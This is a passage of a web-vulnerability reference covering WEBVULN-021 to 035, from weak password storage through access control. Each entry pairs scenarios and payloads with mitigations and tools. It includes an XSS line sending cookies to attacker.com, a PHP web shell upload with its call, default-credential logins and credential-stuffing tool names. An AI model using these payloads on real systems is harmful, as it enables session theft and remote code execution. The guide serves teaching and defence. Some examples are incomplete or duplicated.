- John the Ripper (for cracking password hashes)
- OWASP ZAP (for vulnerability scanning and brute force testing)

---

## 📚 References
- OWASP: Password Cracking  
- PortSwigger: Password Cracking  
- OWASP Cheat Sheet: Secure Authentication

***
# 🌐 WebVuln-021: Weak Password Storage

**Category:**  
Authentication

**Vulnerability ID:**  
`WEBVULN-021`

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
A system stores passwords in an insecure manner, such as in plain text or using weak encryption/hashing algorithms.

---

### 🧩 Payload:
- **Plain Text Storage**: The password is stored directly in the database without encryption or hashing.
- **Weak Hashing Algorithm**: Storing passwords using weak algorithms like MD5 or SHA1, which are vulnerable to collision or brute force attacks.

---

### ✅ Effect:
- **Exposure of User Credentials**: If the database is compromised, attackers can easily recover and misuse passwords if stored in an insecure manner.

---

## 🌐 PoC Platforms:
You can simulate this vulnerability using:

- DVWA
- bWAPP
- WebGoat

---

## 🛡️ Mitigation
- ✅ **Use Strong Hashing Algorithms**  
  Hash passwords with strong algorithms like bcrypt, Argon2, or PBKDF2.
  
- ✅ **Use Salted Hashes**  
  Add a unique salt to each password before hashing to prevent rainbow table attacks.

- ✅ **Use Key Stretching**  
  Employ key stretching techniques (e.g., bcrypt) to increase the time needed to compute password hashes.

- ✅ **Encrypt Sensitive Data**  
  Store sensitive data like passwords using strong encryption methods, such as AES-256.

  ***
  # 🌐 WebVuln-022: Credential Reuse

**Category:**  
Authentication and Session Management

**Vulnerability ID:**  
**WEBVULN-022**

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
Credential reuse happens when a user uses the same password across multiple services. An attacker who gains access to one service may use the same credentials to gain unauthorized access to other services (e.g., using breached credentials from a data leak).

### 🔑 Example:
- If a user’s password is found in a data breach (e.g., via a service like Have I Been Pwned), an attacker can use the same password on other platforms to try and break into the user’s accounts on different sites.

---

## 💥 Payload:

- **Credential List:**  
  User credentials (e.g., username and password) from one service can be reused to attempt login to other platforms that the user might have an account with.

---

### ✅ Effect

- **Unauthorized Access:**  
  Attackers can access multiple services or systems if a user has reused the same credentials across different sites.

- **Account Takeover:**  
  Attackers can take over user accounts in multiple platforms without needing to bypass individual authentication mechanisms.

---

## 🌐 PoC Platforms

Simulate this vulnerability by using the following:

- **Have I Been Pwned** (to check if credentials were part of a breach)
- **Credential Stuffing Attack Simulation:**  
  Use tools like **Sentry MBA** or **Snipr** to simulate credential stuffing attacks.

---

## 🛡️ Mitigation

To mitigate the risk of credential reuse, consider the following best practices:

- ✅ **Use Unique Passwords:**  
  Encourage users to use different passwords for every service. Password managers can help users store unique passwords securely.

- ✅ **Implement Two-Factor Authentication (2FA):**  
  Even if credentials are reused, 2FA will prevent unauthorized access, as attackers would need the second factor (e.g., an SMS code or authentication app code).

- ✅ **Monitor for Breaches:**  
  Use services like **Have I Been Pwned** to monitor for any breaches of your system’s users. Notify users to change their passwords if their credentials are exposed in any breach.

- ✅ **Password Policies:**  
  Enforce strong password policies (e.g., minimum length, special characters, etc.) to ensure users create hard-to-guess passwords.

- ✅ **Account Lockout & Rate Limiting:**  
  To protect against credential stuffing, implement rate-limiting, CAPTCHA challenges, and account lockouts after multiple failed login attempts.

---

## 🔧 Testing Tools / Techniques

- **Burp Suite:**  
  Use the Intruder feature to attempt credential stuffing with known breached passwords.

- **OWASP ZAP:**  
  Use ZAP to simulate attacks that test for weak or reused passwords across multiple services.

- **Have I Been Pwned API:**  
  Use the API to check if the user’s credentials have been part of a known data breach.

- **Hydra:**  
  Use Hydra for brute-force or credential-stuffing attacks if the target allows for automated login attempts.

- **Manual Testing:**  
  Test for weak or reused passwords by attempting logins with breached credentials or default password lists.

---

## 📚 References

- **OWASP: Password Management Cheat Sheet**  
  Link: [OWASP Password Management](https://cheatsheetseries.owasp.org/cheatsheets/Password_Management_Cheat_Sheet.html)

- **OWASP Top 10 - A2: Broken Authentication**  
  Link: [OWASP Top 10](https://owasp.org/www-project-top-ten/)

- **Have I Been Pwned:**  
  Link: [Have I Been Pwned](https://haveibeenpwned.com/)

- **PortSwigger: Credential Stuffing Attacks**  
  Link: [PortSwigger Credential Stuffing](https://portswigger.net/research/credential-stuffing)

- **OWASP Cheat Sheet: Secure Password Storage**  
  Link: [OWASP Secure Password Storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)


---

## 🔧 Testing Tools / Techniques
- Burp Suite (to intercept login requests and test password storage)
- John the Ripper (to test password hash strength)
- Hashcat (for cracking weakly hashed passwords)
- OWASP ZAP (to test for weak password storage vulnerabilities)

---

## 📚 References
- OWASP: Password Storage Cheat Sheet  
- OWASP Top 10 - A2: Broken Authentication  
- PortSwigger: Password Storage Vulnerabilities  
- OWASP Cheat Sheet: Secure Storage of Passwords

***
# 🌐 WebVuln-023: Insecure Authentication

**Category:**  
Authentication

**Vulnerability ID:**  
**`WEBVULN-023`**

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
A web application fails to securely authenticate users, allowing unauthorized access or weak user verification. This can occur through improper implementation of authentication mechanisms, such as insecure session management or missing authentication mechanisms.

---

### 🧩 Payload:
- **Missing Session Expiry**: A session is not terminated after user logout or after a certain period of inactivity.
- **Weak Password Policies**: Allowing users to create easily guessable passwords (e.g., "password123").
- **Bypassing Authentication**: An attacker finds ways to bypass authentication, such as manipulating URL parameters or accessing sensitive endpoints without proper checks.

---

### ✅ Effect:
- **Unauthorized Access**: Attackers can gain access to restricted areas or accounts without proper authentication.
- **Session Hijacking**: If authentication tokens are poorly managed or transmitted insecurely, they can be hijacked.

---

## 🌐 PoC Platforms:
You can simulate this vulnerability using:

- DVWA
- bWAPP
- WebGoat

---

## 🛡️ Mitigation
- ✅ **Implement Secure Authentication Protocols**  
  Use strong authentication mechanisms like OAuth2, OpenID Connect, or multi-factor authentication (MFA).
  
- ✅ **Enforce Strong Password Policies**  
  Require strong passwords with a mix of letters, numbers, and special characters.

- ✅ **Use Secure Session Management**  
  Ensure that sessions are securely managed, with proper expiry, regeneration after login, and timeout mechanisms.

- ✅ **Implement CAPTCHA and Rate Limiting**  
  Use CAPTCHA and rate limiting to prevent automated login attempts and brute force attacks.

---

## 🔧 Testing Tools / Techniques
- Burp Suite (to intercept and test authentication flows)
- OWASP ZAP (for scanning insecure authentication mechanisms)
- Hydra (for testing login forms with common usernames and passwords)
- Manual testing of login and session management mechanisms

---

## 📚 References
- OWASP: Insecure Authentication  
- PortSwigger: Insecure Authentication  
- OWASP Cheat Sheet: Authentication  
- OWASP Top 10 - A2: Broken Authentication

***
# 🌐 WebVuln-024: Cookie Theft

**Category:**  
Session Management

**Vulnerability ID:**  
`WEBVULN-024`

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
An attacker can steal session cookies or authentication tokens through various means, such as **XSS** or **MITM** attacks, or by exploiting insecure cookie handling mechanisms in the web application.

---

### 🧩 Payload

#### **XSS (Cross-Site Scripting)**
Injecting malicious JavaScript into the application to steal cookies.

Example:
```javascript
document.location = 'http://attacker.com/cookie?'+document.cookie;
```
## 🌐 MITM Attack

If no encryption (SSL/TLS) is used, an attacker on an insecure network can intercept HTTP traffic and capture cookies.

---

### ✅ Effect

- **Session Hijacking:**  
  Once an attacker steals a valid session cookie, they can impersonate the victim and gain unauthorized access to their account or session.

- **Credential Theft:**  
  Cookies containing sensitive data, such as authentication tokens, can be captured and used for further attacks, like credential stuffing.

---

## 🌐 PoC Platforms

You can simulate this vulnerability using the following platforms:

- **DVWA (Damn Vulnerable Web Application)**  
- **bWAPP (Buggy Web Application)**  
- **WebGoat (A security-focused web application)**

---

## 🛡️ Mitigation

To mitigate the risk of cookie theft, consider the following best practices:

- ✅ **Use Secure Cookies:**  
  Ensure cookies are marked with the `HttpOnly`, `Secure`, and `SameSite` flags to reduce the risk of theft via XSS and ensure cookies are only sent over HTTPS.

- ✅ **Implement SSL/TLS (HTTPS):**  
  Always use HTTPS to encrypt communication between the client and server, which helps prevent MITM attacks and protects session cookies in transit.

- ✅ **Use SameSite Cookies:**  
  Set the `SameSite` attribute of cookies to `Strict` or `Lax` to mitigate CSRF (Cross-Site Request Forgery) and reduce the risk of cookie theft through cross-site attacks.

- ✅ **Regular Session Regeneration:**  
  Regenerate session IDs after login and periodically during a session to prevent session fixation and reduce the impact of stolen session cookies.

- ✅ **Implement Token-Based Authentication:**  
  Use token-based authentication mechanisms (e.g., JWT) for stateless sessions to prevent the reliance on session cookies.

---

## 🔧 Testing Tools / Techniques

The following tools and techniques can be used to test for and exploit cookie theft vulnerabilities:

- **Burp Suite:**  
  Use Burp Suite to intercept and manipulate cookies, as well as to test for vulnerabilities in session management.

- **OWASP ZAP:**  
  A popular open-source tool for security testing, including scanning for XSS vulnerabilities and insecure cookie handling.

- **Wireshark:**  
  Use Wireshark to sniff unencrypted HTTP traffic and capture session cookies if no SSL/TLS encryption is used.

- **Manual Testing:**  
  Test for weak or missing cookie flags, XSS vulnerabilities, and other session management weaknesses manually.

---

## 📚 References

- **OWASP: Session Management**  
  Link: [OWASP Session Management](https://owasp.org/www-project-top-ten/)

- **OWASP Top 10 - A2: Broken Authentication**  
  Link: [OWASP Top 10](https://owasp.org/www-project-top-ten/)

- **PortSwigger: Cookie Theft and XSS**  
  Link: [PortSwigger Cookie Theft](https://portswigger.net/web-security/cross-site-scripting)

- **OWASP Cheat Sheet: Secure Session Management**  
  Link: [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)


***
## PART III Sensitive Data Exposure
***
Sensitive Data Exposure
---
### WEBVULN-025: Inadequate Encryption

---

#### 📂 Category:
Cryptographic Issues

---

#### 🐞 Vulnerability:
Inadequate Encryption

---

#### 🔍 Description:
Inadequate encryption refers to the use of weak, outdated, or improperly implemented cryptographic algorithms, libraries, or protocols. This allows attackers to potentially decrypt, alter, or impersonate data and communications. Common scenarios include:
- Use of outdated SSL/TLS versions (e.g., SSLv3, TLS 1.0).
- Weak encryption algorithms (e.g., RC4, DES, MD5).
- Poor key management (e.g., hardcoded or reused keys).
- Missing encryption for sensitive data at rest or in transit.

---

#### 💣 Demo / Proof of Concept:

**Scenario**:  
A login form submits credentials over HTTP or via a weak cipher suite in TLS. An attacker on the same network captures traffic using a packet sniffer and extracts login credentials.

**Example Attack Tools**:
- `Wireshark` for traffic sniffing.
- `mitmproxy` for interception and SSL stripping.
- `testssl.sh` for detecting weak TLS configurations.

---

#### 🛡️ Mitigation:

- Enforce HTTPS using TLS 1.2 or higher (preferably TLS 1.3).
- Disable weak ciphers and insecure protocol versions in server configuration.
- Use strong algorithms (e.g., AES-GCM, SHA-256, RSA-2048+).
- Implement proper key management (e.g., key rotation, secure storage).
- Use HSTS to prevent protocol downgrade attacks.

---

#### 🧪 Testing Tools / Techniques:

- **testssl.sh**
- **Qualys SSL Labs** (https://www.ssllabs.com/ssltest/)
- `nmap --script ssl-enum-ciphers -p 443 <target>`
- `openssl s_client -connect <host>:443 -cipher LOW`

---

#### 📚 References:

- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
- [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
- [CWE-326: Inadequate Encryption Strength](https://cwe.mitre.org/data/definitions/326.html)
- [Mozilla SSL Configuration Generator](https://ssl-config.mozilla.org/)

***
### WEBVULN-026: Insecure Direct Object Reference (IDOR)

---

#### 📂 Category:
Broken Access Control

---

#### 🐞 Vulnerability:
Insecure Direct Object Reference (IDOR)

---

#### 🔍 Description:
Insecure Direct Object Reference (IDOR) occurs when an application provides direct access to objects (such as files, database records, or URLs) based on user-supplied input without proper access control checks. An attacker can manipulate input parameters to gain unauthorized access to data or actions.

**Example Scenarios**:
- Accessing another user’s account data by changing a user ID in the URL.
- Downloading restricted files by altering file path or ID.
- Viewing or editing other users’ invoices, tickets, or orders.

---

#### 💣 Demo / Proof of Concept:

**Scenario**:  
A user accesses their profile using this URL:

By modifying the `id` parameter to `1002`, they can view another user's profile:


**Tools Used**:
- Burp Suite Repeater or Intruder
- Postman
- Custom Python scripts for parameter fuzzing

---

#### 🛡️ Mitigation:

- Enforce strict access controls on the server side.
- Never rely on client-side checks for authorization.
- Use indirect references such as UUIDs or securely mapped tokens.
- Implement object-level permission checks for every request.
- Log access violations and monitor unusual access patterns.

---

#### 🧪 Testing Tools / Techniques:

- Manual testing with Burp Suite or Postman
- OWASP ZAP with forced browsing
- Fuzzing predictable parameters and observing responses
- Review logs for unauthorized access attempts

---

#### 📚 References:

- [OWASP IDOR Guide](https://owasp.org/www-community/attacks/Indirect_Object_Reference)
- [OWASP Broken Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Broken_Access_Control_Cheat_Sheet.html)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html)

***
## WEBVULN-027: Data Leakage

**Category:** Information Disclosure

**Vulnerability:** Data Leakage

**Description:**
Data leakage refers to the unintended or unauthorized exposure of sensitive information, such as application configuration details, environment variables, internal API keys, credentials, stack traces, internal IPs, source code, or PII (Personally Identifiable Information). This often occurs due to misconfigurations, verbose error messages, improper access controls, or unfiltered user input being echoed back to the client.

Common causes include:
- Verbose error handling in production environments
- Exposing `.git/`, `.env`, `backup/`, or similar directories/files
- Debug features being enabled in production
- Improperly configured cloud storage (e.g., public S3 buckets)
- Misconfigured API responses

**Demo/Proof of Concept:**
1. Accessing exposed `.env` file:
`https://example.com/.env`
May reveal:
DB_PASSWORD=SuperSecret123 API_KEY=abcd1234efgh5678


2. Verbose error:
```http
GET /api/user?id=notanumber HTTP/1.1

HTTP/1.1 500 Internal Server Error
Content-Type: text/html

Exception: TypeError at /api/user
int() argument must be a string, a bytes-like object or a number, not 'NoneType'

Publicly accessible backup:
`https://example.com/backup.zip`

### 📟 Verbose Error Example

```http
GET /api/user?id=notanumber HTTP/1.1

HTTP/1.1 500 Internal Server Error
Content-Type: text/html

Exception: TypeError at /api/user
int() argument must be a string, a bytes-like object or a number, not 'NoneType'
```

---

### 💾 Publicly Accessible Backup

```text
https://example.com/backup.zip
```

---

### 🛡️ Mitigation

- Disable detailed error messages in production.
- Use environment variables securely and restrict access to internal files like `.env`, `.git/`, `config/`, etc.
- Ensure cloud storage buckets are private by default.
- Apply proper access control and input validation.
- Scan and monitor endpoints for sensitive file exposure.
- Implement logging and alerting mechanisms for unusual data access patterns.
- Run content security audits regularly.

---

### 🧪 Testing Tools/Techniques

- Manual inspection of URLs and hidden directories
- Directory brute-forcing tools like:
  - `dirsearch`
  - `gobuster`
  - `ffuf`
- Inspect HTTP responses for stack traces and detailed errors
- Use recon tools to find open cloud buckets or backup files:
  - `AWSBucketDump`
  - `S3Scanner`
- Check for known leaks using tools like:
  - `truffleHog`
  - `GitLeaks`

---

### 📚 References

- [OWASP: Information Leakage](https://owasp.org/www-community/Improper_Information_Leakage)
- [OWASP Testing Guide: Testing for Information Leakage](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/01-Testing_for_Information_Leakage.html)
- [GitHub - truffleHog](https://github.com/trufflesecurity/trufflehog)
- [GitHub - GitLeaks](https://github.com/gitleaks/gitleaks)

***
## WEBVULN-028: Unencrypted Data Storage

**Category:** Insecure Data Storage

**Vulnerability:** Unencrypted Data Storage

**Description:**
Unencrypted data storage occurs when sensitive information such as passwords, access tokens, personally identifiable information (PII), or financial records is stored in plaintext — whether in databases, local files, cookies, or logs — without adequate encryption mechanisms in place. This poses a serious security risk in case of data breaches, physical device theft, or server compromise.

Common causes include:
- Developers storing credentials or tokens in plaintext for debugging or simplicity.
- Misconfigured database storage lacking field-level encryption.
- Client-side storage of tokens or secrets in localStorage/sessionStorage.
- Logs capturing sensitive inputs or responses in readable form.

---

### 💣 Risk Example

```text
users.db
--------------
username: johndoe
password: hunter2
email: johndoe@example.com
card_number: 4111111111111111
cvv: 123
```

This file is stored unencrypted on disk and is readable by anyone with file access.

---

### 🛡️ Mitigation

- Use strong encryption (AES-256 or better) for storing sensitive data at rest.
- Store cryptographic keys securely (e.g., in HSMs or dedicated key management services).
- Hash passwords using secure algorithms like `bcrypt`, `argon2`, or `PBKDF2`.
- Avoid storing unnecessary sensitive data; follow data minimization principles.
- Avoid storing secrets in client-side localStorage/sessionStorage.
- Regularly audit stored data and review access control policies.
- Ensure backups are also encrypted and securely stored.
- Sanitize logs to remove or mask sensitive data.

---

### 🧪 Testing Tools/Techniques

- Inspect backend database storage for plaintext entries.
- Search project directories for `.db`, `.log`, `.bak`, or `.json` files with sensitive data.
- Review app logs for exposed passwords, tokens, or payment info.
- Use mobile app assessment tools to scan local data storage:
  - `MobSF`
  - `Frida`
  - `Objection`
- Review browser dev tools for client-side secrets in localStorage or cookies.

---

### 📚 References

- [OWASP Mobile Top 10: M2 - Insecure Data Storage](https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage)
- [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
- [NIST SP 800-57 Part 1: Key Management Guidelines](https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final)

***
## WEBVULN-029: Missing Security Headers

**Category:** Security Misconfiguration

**Vulnerability:** Missing Security Headers

**Description:**
Missing security headers in HTTP responses can leave web applications vulnerable to a wide range of attacks, including clickjacking, XSS, MIME sniffing, and more. Security headers are part of defense-in-depth and provide essential protection by instructing browsers how to behave when interacting with your site.

Common missing headers and their impact:
- `Content-Security-Policy`: Prevents XSS by controlling sources of scripts, styles, etc.
- `X-Frame-Options`: Protects against clickjacking by preventing framing.
- `X-Content-Type-Options`: Stops MIME-sniffing attacks.
- `Strict-Transport-Security`: Enforces HTTPS connections.
- `Referrer-Policy`: Controls the amount of referrer information sent.
- `Permissions-Policy`: Restricts use of browser features (e.g., camera, microphone).
- `Cross-Origin-Embedder-Policy`, `Cross-Origin-Resource-Policy`, and `Cross-Origin-Opener-Policy`: Provide protections against cross-origin attacks.

---

### 📄 Risk Example

```http
HTTP/1.1 200 OK
Content-Type: text/html

<!-- No security headers present -->
```

This allows an attacker to:
- Inject scripts (`XSS`)
- Embed the site in an `<iframe>` (`clickjacking`)
- Trick the browser into interpreting data incorrectly (`MIME sniffing`)

---

### 🛡️ Mitigation

- Set the following headers on all HTTP responses:

```http
Content-Security-Policy: default-src 'self';
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Referrer-Policy: no-referrer
Permissions-Policy: geolocation=(), camera=()
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
```

- Use a web server or middleware (e.g., Nginx, Apache, Express.js Helmet) to enforce headers globally.
- Regularly test for header presence using security scanners.
- Customize CSP rules according to your app’s needs (avoid overly permissive values like `unsafe-inline`).

---

### 🧪 Testing Tools/Techniques

- Use online scanners:
  - [SecurityHeaders.com](https://securityheaders.com/)
  - [Mozilla Observatory](https://observatory.mozilla.org/)
- Use command-line tools:
  - `curl -I https://yourdomain.com`
  - `nmap --script http-security-headers`
- Analyze browser DevTools > Network > Headers tab
- Automate checks using CI/CD security tools or SAST scanners

---

### 📚 References

- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [Mozilla Developer Docs: Security Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
- [OWASP Cheat Sheet: HTTP Headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)

***
## WEBVULN-030: Insecure File Handling

**Category:** Insecure File Upload / Access Control

**Vulnerability:** Insecure File Handling

**Description:**
Insecure file handling occurs when applications improperly process, upload, or serve files. This includes weak validation of uploaded file types, poor access controls on file storage, and unsafe file execution. These flaws can lead to arbitrary code execution, path traversal, denial of service, or sensitive file disclosure.

Common insecure practices:
- Allowing upload of executable files (e.g., `.php`, `.exe`, `.sh`)
- Using user input in file paths without sanitization
- Storing uploaded files in publicly accessible directories
- Not scanning or validating file content
- Serving files based on MIME type without proper checks

---

### 🐚 Risk Example

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

Then accessing:
```text
https://example.com/uploads/shell.php?cmd=whoami
```

If the server executes the PHP file, this results in **remote code execution**.

---

### 🛡️ Mitigation

- Restrict allowed file types by MIME type and extension (e.g., images only).
- Rename uploaded files and store them with randomized, non-user-controllable names.
- Use file storage outside of the web root or protect directories with `.htaccess` or server rules.
- Never serve uploaded files directly without access checks.
- Validate file content (magic numbers) in addition to extensions.
- Scan files with antivirus/malware tools before storing.
- Use a dedicated file upload handler or service (e.g., S3 + signed URLs).
- Apply server-side file size limits and sanitize file names.
- Disable script execution in upload directories.

---

### 🧪 Testing Tools/Techniques

- Attempt to upload files with extensions like `.php`, `.jsp`, `.exe`, `.aspx`
- Try path traversal using `../` in filenames or download paths
- Upload files with fake extensions or mismatched MIME types
- Use tools like:
  - `Burp Suite`
  - `Upload Scanner`
  - `OWASP ZAP`
- Manually inspect upload directory structure and permissions

---

### 📚 References

- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [OWASP Testing Guide: Testing for File Upload](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/10-Input_Validation_Testing/06-Testing_for_File_Upload/)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)


***

## PART IV 
### SECURITY MIS-CONFIGURATION:

---
# WEBVULN-031: Default Passwords

---

## 🏷️ Category:
Authentication Issues

---

## 🐞 Vulnerability:
Use of Default Credentials

---

## 📖 Description:

Many systems ship with factory-set usernames and passwords (e.g., `admin:admin`, `root:toor`). If these credentials are not changed, attackers can easily gain unauthorized access using widely known defaults. Devices like routers, cameras, databases, and CMSs are especially vulnerable.

This vulnerability is commonly exploited in automated attacks and botnet propagation (e.g., Mirai botnet).

---

## 💥 Demo / Proof of Concept:

```
Target: http://example.com/admin

Login:
Username: admin
Password: admin

# Login successful – admin dashboard accessible
```

Or try common services like:

```
Service: MySQL
Username: root
Password: (empty)
```

---

## 🛡️ Mitigation:

- Enforce password changes on first login for all default accounts.
- Disable or remove default accounts entirely if unnecessary.
- Implement strong password policies and validation.
- Audit systems during deployment for leftover default credentials.
- Use centralized authentication mechanisms (LDAP, SSO) when possible.
- Monitor login attempts and rate-limit authentication endpoints.

---

## 🧪 Testing Tools / Techniques:

- Manual login attempts using known default credentials
- Use automated tools with credential dictionaries:
  - `hydra`
  - `medusa`
  - `ncrack`
- Perform service enumeration to identify potential access points
- Check device documentation for listed factory defaults

---

## 🔗 References:

- OWASP: [Default Passwords](https://owasp.org/www-community/Using_default_password)
- CWE-521: [Weak Password Requirements](https://cwe.mitre.org/data/definitions/521.html)
- Rapid7: [Default Credentials Cheat Sheet](https://www.rapid7.com/db/default-creds)
- NIST SP 800-63: [Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)

***

# WEBVULN-032: Directory Listing

---

## 🏷️ Category:
Information Disclosure

---

## 🐞 Vulnerability:
Enabled Directory Listing

---

## 📖 Description:

Directory listing is a web server misconfiguration where the contents of a directory are exposed if no `index.html` (or equivalent) file is present. This allows attackers to browse directories, view files, download backups, scripts, or credentials unintentionally left on the server.

It often reveals sensitive files such as:

- `.env`, `.git/`, config files
- Backup archives like `backup.zip`, `site.bak`
- Development files, test scripts, or credentials

---

## 💥 Demo / Proof of Concept:

Request:

```
GET /uploads/ HTTP/1.1
Host: vulnerable-site.com
```

Response:

```html
Index of /uploads/

[To Parent Directory]
 config.php
 db_backup.sql
 test.php
 users.csv
```

---

## 🛡️ Mitigation:

- Disable directory listing in the web server configuration:

  - **Apache**: `Options -Indexes`
  - **Nginx**: `autoindex off;`
  - **IIS**: Disable "Directory Browsing" in IIS settings

- Use `.htaccess` to block access to sensitive folders
- Place a default `index.html` in public directories
- Move non-public files outside the web root
- Use proper file permissions to restrict access

---

## 🧪 Testing Tools / Techniques:

- Manual browsing to common directories (`/uploads/`, `/files/`, `/backup/`)
- Use automated directory brute-forcing tools:
  - `dirsearch`
  - `gobuster`
  - `ffuf`
- Observe HTTP responses for lack of `403` on folders
- Review server configurations and permissions

---

## 🔗 References:

- OWASP: [Directory Listing](https://owasp.org/www-community/attacks/Directory_Listing)
- Apache Docs: [mod_autoindex](https://httpd.apache.org/docs/current/mod/mod_autoindex.html)
- Nginx Docs: [autoindex Module](https://nginx.org/en/docs/http/ngx_http_autoindex_module.html)

***
# WEBVULN-033: Unprotected API Endpoints

---

## 🏷️ Category:
Access Control / API Security

---

## 🐞 Vulnerability:
Unprotected or Poorly Protected API Endpoints

---

## 📖 Description:

APIs often expose backend functionality directly, but when authentication and authorization are missing or weak, attackers can exploit these endpoints to access, modify, or delete sensitive data.

Unprotected APIs are frequently overlooked during testing and may lack:

- Authentication (public access)
- Authorization checks (user role validation)
- Rate limiting (brute-force protection)
- Input validation (injection vectors)

---

## 💥 Demo / Proof of Concept:

Unauthenticated request:

```
GET /api/users HTTP/1.1
Host: vulnerable-site.com
```

Response:

```json
[
  { "id": 1, "username": "admin", "email": "admin@example.com" },
  { "id": 2, "username": "jdoe", "email": "john@example.com" }
]
```

Another common issue:

```
DELETE /api/users/1 HTTP/1.1
Host: vulnerable-site.com
Authorization: Bearer <user-token>
```

Response: `200 OK` – Admin account deleted without proper permission check.

---

## 🛡️ Mitigation:

- Require strong authentication for all API endpoints
- Enforce role-based access control (RBAC) and permission checks
- Implement input validation and output encoding
- Apply rate limiting, IP throttling, and CAPTCHA mechanisms
- Use API gateways to manage traffic and security
- Avoid exposing internal API routes or test/debug endpoints in production
- Log and monitor API access patterns

---

## 🧪 Testing Tools / Techniques:

- Manual endpoint fuzzing using:
  - `curl`
  - Postman
  - Burp Suite
- Automated API scanning tools:
  - `OWASP ZAP`
  - `Nikto`
  - `APIsec`
- Check API documentation vs implementation for unlisted or hidden endpoints
- Attempt privilege escalation (e.g., regular user accessing admin resources)
- Replay requests with manipulated tokens or none at all

---

## 🔗 References:

- OWASP API Top 10: [Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- OWASP: [API Security Project](https://owasp.org/www-project-api-security/)
- PortSwigger: [Testing API endpoints](https://portswigger.net/web-security/api)

***
# WEBVULN-034: Open Ports and Services

---

## 🏷️ Category:
Infrastructure Misconfiguration

---

## 🐞 Vulnerability:
Exposed/Open Ports and Services

---

## 📖 Description:

When unnecessary ports and services are left open on a server, attackers can identify and exploit them to gain unauthorized access, extract data, or pivot further into a network.

Common exposures include:

- Admin interfaces (e.g., :8080, :8000, :3306)
- Development ports (e.g., :5000 Flask, :3000 Node.js)
- Debug or remote access services (e.g., Telnet, RDP, SSH)
- Databases (MySQL, MongoDB) exposed without authentication

Such services are often left running after development or during misconfigured deployments.

---

## 💥 Demo / Proof of Concept:

Scan a target with Nmap:

```
nmap -Pn -p- example.com
```

Output:

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy
```

Direct access attempt:

```
curl http://example.com:8080
# Access to unprotected admin panel
```

---

## 🛡️ Mitigation:

- Close all non-essential ports
- Use firewalls (e.g., iptables, ufw) to restrict access
- Restrict internal services to private IPs or local loopback
- Implement authentication and encryption (e.g., SSH keys, TLS)
- Regularly scan infrastructure for exposed services
- Use jump hosts and VPNs to access internal services
- Set up alerts for unusual network exposure

---

## 🧪 Testing Tools / Techniques:

- Port scanning:
  - `nmap`
  - `masscan`
  - `rustscan`
- Banner grabbing with `netcat` or `telnet`
- Check cloud provider firewall/security group rules
- Shodan or Censys lookup for external exposure
- Monitor for new or unexpected services with:
  - `nagios`, `zabbix`, `osquery`

---

## 🔗 References:

- OWASP: [Testing for Network Infrastructure Misconfiguration](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_Network_Infrastructure_Misconfiguration.html)
- Nmap Docs: [https://nmap.org/book/inst-windows.html](https://nmap.org/book/inst-windows.html)
- SANS: [Secure Network Design](https://www.sans.org/white-papers/secure-network-design/)

***
# WEBVULN-035: Improper Access Control

---

## 🏷️ Category:
Access Control

---

## 🐞 Vulnerability:
Improper or Broken Access Control

---

## 📖 Description:

Improper access control occurs when a web application fails to properly restrict what authenticated users can do or see. This allows attackers to access unauthorized data or actions by manipulating URLs, parameters, or tokens.

Common examples include:

- Accessing admin functions as a regular user
- Changing user ID in URL to view/edit other users’ data
- Unauthorized access to hidden or unlinked endpoints
- Performing actions outside intended roles (e.g., escalation from user to admin)

Improper access control is consistently ranked as one of the most critical web vulnerabilities (e.g., OWASP Top 10 A01:2021).

---

## 💥 Demo / Proof of Concept:

```
Request:
GET /api/users/1001/profile HTTP/1.1
Authorization: Bearer user-token

Response:
{
  "id": 1001,
  "username": "admin",
  "email": "admin@example.com"
}
```

In this case, a regular user can access admin data simply by modifying the user ID in the URL.

---

## 🛡️ Mitigation:

- Enforce **role-based access control (RBAC)** or attribute-based access control (ABAC)
- Never rely on client-side validation or UI restrictions alone
- Validate all access permissions server-side
- Use secure session management and token scopes
- Deny access by default; explicitly allow actions per role
- Avoid exposing internal object references (use indirect IDs or UUIDs)
